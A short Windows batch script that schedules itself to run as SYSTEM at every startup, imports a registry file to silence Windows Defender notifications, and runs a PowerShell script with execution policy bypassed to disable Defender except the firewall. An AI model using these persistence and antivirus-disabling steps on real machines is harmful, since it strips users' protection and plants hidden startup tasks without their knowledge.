@ECHO OFF
setlocal enableDelayedExpansion
REM ## Create Admin Startup of itself ##
schtasks /create /tn "WDStaticDisabler" /ru system /sc onstart /tr "%~f0" /F
REM ## Disables Windows Defender Notfications ##
reg import "%~dp0WDDisable.reg"
REM ## Disable Windows Defender Except Firewall ##
powershell -ExecutionPolicy Bypass -File "%~dp0WDDisable.ps1"
